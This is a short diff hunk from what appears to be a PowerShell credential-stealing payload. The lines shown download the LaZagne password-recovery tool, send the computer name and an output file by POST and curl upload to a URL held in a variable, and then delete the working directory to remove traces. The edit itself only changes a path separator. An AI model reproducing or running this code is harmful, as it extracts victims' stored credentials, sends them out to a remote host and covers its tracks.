@@ -97,7 +97,7 @@ Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download
 
 # Exfiltrate the file
 #POST REQUEST
-$Body=@{ content = "$env:computername Stats"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$dir/output.txt" $url 
+$Body=@{ content = "$env:computername Stats"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);curl.exe -F "file1=@$dir\output.txt" $url 
 
 # Clean up
 Remove-Item -Path $dir -Recurse -Force
